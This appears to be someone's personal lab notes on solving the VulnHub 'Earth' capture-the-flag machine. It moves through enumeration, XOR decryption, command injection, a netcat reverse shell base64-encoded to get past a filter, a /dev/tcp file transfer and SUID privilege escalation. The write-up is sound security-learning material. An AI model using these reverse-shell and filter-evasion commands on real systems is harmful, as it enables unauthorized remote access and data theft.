This guy configurates everithing on virutal box with "host only adapter" and not with "bridge adapter"

192.168.100.37

"ENUMERATION PHASE"

he uses #netdiscover 
```
sudo netdiscover -i eth1 (in my case wlan0)

```
its better specify the range because its can take too much time 

now he is using nmap with the -sV -sC -v (just one v) -T4 
```
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 8.6 (protocol 2.0)
| ssh-hostkey: 
|   256 5b2c3fdc8b76e9217bd05624dfbee9a8 (ECDSA)
|_  256 b03c723b722126ce3a84e841ecc8f841 (ED25519)
80/tcp  open  http     Apache httpd 2.4.51 ((Fedora) OpenSSL/1.1.1l mod_wsgi/4.7.1 Python/3.9)
|_http-title: Bad Request (400)
|_http-server-header: Apache/2.4.51 (Fedora) OpenSSL/1.1.1l mod_wsgi/4.7.1 Python/3.9
443/tcp open  ssl/http Apache httpd 2.4.51 ((Fedora) OpenSSL/1.1.1l mod_wsgi/4.7.1 Python/3.9)
|_ssl-date: TLS randomness does not represent time
|_http-server-header: Apache/2.4.51 (Fedora) OpenSSL/1.1.1l mod_wsgi/4.7.1 Python/3.9
| ssl-cert: Subject: commonName=earth.local/stateOrProvinceName=Space
| Subject Alternative Name: DNS:earth.local, DNS:terratest.earth.local
| Issuer: commonName=earth.local/stateOrProvinceName=Space
| Public Key type: rsa
| Public Key bits: 4096
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2021-10-12T23:26:31
| Not valid after:  2031-10-10T23:26:31
| MD5:   4efa65d21a9e07184b5441da3712f187
|_SHA-1: 04db5b29a33f8076f16b8a1b581d6988db257651
| tls-alpn: 
|_  http/1.1
|_http-title: Bad Request (400)
MAC Address: 08:00:27:F3:A1:51 (Oracle VirtualBox virtual NIC)
```
There are two DNS  earth.local, and  terratest.earth.local


we open sudo  nano /etc/hosts/ 
and in the 192.168.100.36 we put de DNS that we previuosly found (! its important to use a vertical terminal on this moment and copy the DNS it's easier)
```
  GNU nano 7.2                       /etc/hosts *                               
127.0.0.1       localhost
127.0.1.1       cds.cds cds
192.168.100.36  cybox.company webmail.cybox.company dev.cybox.company monitor.c>
192.168.100.37 earth.local terratest.earth.local

# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters



```

There are a couple of encrypted keys or something  on the bottom of earth.local

![[bottom.png]]

when you write something on the website , another encrypted message appears.
#gobuster
Probably we have directorys hidden we must do a "directory busting"

*sudo gobuster dir -u http://earth.local -w /usr/share/wordlists/dirb/common.txt*  

```
cds@cds:~/Documentos/Workspace/Virtual machines/pentesting/planets-earth$ sudo gobuster dir -u http://earth.local -w /usr/share/wordlists/dirb/common.txt 
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://earth.local
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.5
[+] Timeout:                 10s
===============================================================
2023/07/21 03:09:02 Starting gobuster in directory enumeration mode
===============================================================
/admin                (Status: 301) [Size: 0] [--> /admin/]
/cgi-bin/             (Status: 403) [Size: 199]
Progress: 4595 / 4615 (99.57%)
===============================================================
2023/07/21 03:09:32 Finished
===============================================================
```
http://earth.local/admin/
and then we found this
http://earth.local/admin/login
we dont have nothing now but if we go to the secon DNS maybe we can find something

on this page we have a login 
IF WE FIND WITH HTTP://   IT ITS THE SAME SITE THAN EARTH.LOCAL
"https://terratest.earth.local"

There is nothing on the font sourse so we are going to use gobuster again

sudo gobuster dir -u https://terratest.earth.local -k -w /usr/share/wordlists/dirb/common.txt
#gobuster-k
IN THIS INSTANCE ON HTTPS IS IMPORTANT TO USE -k
```
cds@cds:~/Documentos/Workspace/Virtual machines/pentesting/planets-earth$ sudo gobuster dir -u https://terratest.earth.local -k -w /usr/share/wordlists/dirb/common.txt 
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     https://terratest.earth.local
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.5
[+] Timeout:                 10s
===============================================================
2023/07/21 03:20:39 Starting gobuster in directory enumeration mode
===============================================================
/.hta                 (Status: 403) [Size: 199]
/.htaccess            (Status: 403) [Size: 199]
/.htpasswd            (Status: 403) [Size: 199]
/cgi-bin/             (Status: 403) [Size: 199]
/index.html           (Status: 200) [Size: 26]
/robots.txt           (Status: 200) [Size: 521]
Progress: 4614 / 4615 (99.98%)
===============================================================
2023/07/21 03:22:05 Finished
===============================================================
```
The interesting directory on this is /robots.txt

```
User-Agent: *
Disallow: /*.asp
Disallow: /*.aspx
Disallow: /*.bat
Disallow: /*.c
Disallow: /*.cfm
Disallow: /*.cgi
Disallow: /*.com
Disallow: /*.dll
Disallow: /*.exe
Disallow: /*.htm
Disallow: /*.html
Disallow: /*.inc
Disallow: /*.jhtml
Disallow: /*.jsa
Disallow: /*.json
Disallow: /*.jsp
Disallow: /*.log
Disallow: /*.mdb
Disallow: /*.nsf
Disallow: /*.php
Disallow: /*.phtml
Disallow: /*.pl
Disallow: /*.reg
Disallow: /*.sh
Disallow: /*.shtml
Disallow: /*.sql
Disallow: /*.txt
Disallow: /*.xml
Disallow: /testingnotes.*
```
/testingnotes. is interesting here
```
Testing secure messaging system notes:
*Using XOR encryption as the algorithm, should be safe as used in RSA.
*Earth has confirmed they have received our sent messages.
*testdata.txt was used to test encryption.
*terra used as username for admin portal.
Todo:
*How do we send our monthly keys to Earth securely? Or should we change keys weekly?
*Need to test different key lengths to protect against bruteforce. How long should the key be?
*Need to improve the interface of the messaging interface and the admin panel, it's currently very basic.
```
and this is on testingnotes

The key of encription aparently is on testdata.txt and the "encription type is in XOR" so now we are going to use a new tool #cyberchef

https://gchq.github.io/CyberChef/ (the website of use)

https://www.youtube.com/watch?v=TMt7BlgpL3A

Aparently there are various steps on this part ... and the mesage of testdata.txt its a key... and it is not strange message .. it is just a normal message.. we must put UTF-8 AND XOR in the input of bottom .. that we take from the left .. and in the top "from hex"..

![[Cibersecurity/Virtual Machines/Vuln Hub Machines/Planets-earth/IMAGES/encriptacion.png]]

and now we need to copy paste  them one by one 

![[copypaste.png]]

```
earthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimat
```

we get this on the third one

*terra used as username for admin portal.*
and the password maybe is 
earthclimatechangebad4humans

## FOOTHOLD ##

when we log in we have a CLI command input ... (es como una consola remota (??), somos "apache" cuando ponemos whoami)

ls /var/earth_web 

userflag.txt is here

cat /var/earth_web/user_flag.txt

[user_flag_3353b67d6437f07ba7d34afd7d2fc27d]

#remoteshell 
we are going to put this on the CLI command input to get a reverse shell
nc -e /bin/bash 192.168.100.4 4444

and we need to put nc -lvnp 4444 and start listening first
"WE HAVE A WARNING, REMOTE CONNECTIONS ARE FORBIDDEN"
he say that we can bypas this converting it to an decimal notation
 or encoding int on base64format
 #base64

MY IP is with this
```c
 cds@cds:~$ echo nc -e /bin/bash 192.168.100.4 4444 | base64
bmMgLWUgL2Jpbi9iYXNoIDE5Mi4xNjguMTAwLjQgNDQ0NAo=
```

i need to put this on the CLI (my ip encrypted) 
```c
echo 'bmMgLWUgL2Jpbi9iYXNoIDE5Mi4xNjguMTAwLjQgNDQ0NAo=' | base64 -d | bash
```
 
 we are in but we are not root
 ```c
python -c 'import pty;pty.spawn("/bin/bash")'
bash-5.1$ whoami
whoami
apache
bash-5.1$ 
```

## PRIVILEGE SCALATION ##

Lets check our "SUIDS" and check if there's any way to scale to root privileges

```c
find / -perm -u=s 2>/dev/null
```

```c
bash-5.1$ find / -perm -u=s 2>/dev/null
find / -perm -u=s 2>/dev/null
/usr/bin/chage
/usr/bin/gpasswd
/usr/bin/newgrp
/usr/bin/su
/usr/bin/mount
/usr/bin/umount
/usr/bin/pkexec
/usr/bin/passwd
/usr/bin/chfn
/usr/bin/chsh
/usr/bin/at
/usr/bin/sudo
/usr/bin/reset_root
/usr/sbin/grub2-set-bootflag
/usr/sbin/pam_timestamp_check
/usr/sbin/unix_chkpwd
/usr/sbin/mount.nfs
/usr/lib/polkit-1/polkit-agent-helper-1
bash-5.1$ 
```
the reset_root it can be a key important 

we are going to see what kind of archive is , and if we can read it as humans

file /usr/bin/reset_root

```c
bash-5.1$ file /usr/bin/reset_root
file /usr/bin/reset_root
/usr/bin/reset_root: setuid ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=4851fddf6958d92a893f3d8042d04270d8d31c23, for GNU/Linux 3.2.0, not stripped
bash-5.1$ 
```

when you use reset_root you have a "failed" you cannot run the script with this way

abri una terminal aparte con netcat y escucha 
nc -lvnp 3333 > reset_root
, despues corre el comando desde la maquina victima

cat  usr/bin/reset_root > /dev/tcp/192.168.100.4/3333


![[casda.png]]

el archivo reset_root esta en la carpeta cds


![[qwfqw.png]]

chmod +x reset_root

and now we use 
ltrace ./reset_root

if we dont have it sudo apt install ltrace

![[fewfwe.png]]

debemos crear esos archivos que se hicieron en la maquina victima

touch dev/shm/dwef , etc ( en la carpeta que ya estabamos)

ahora podemos hacer reset_root

![[passssss.png]]

las passssss

su root ... Earth

cd /root/ ahi esta la flag de root 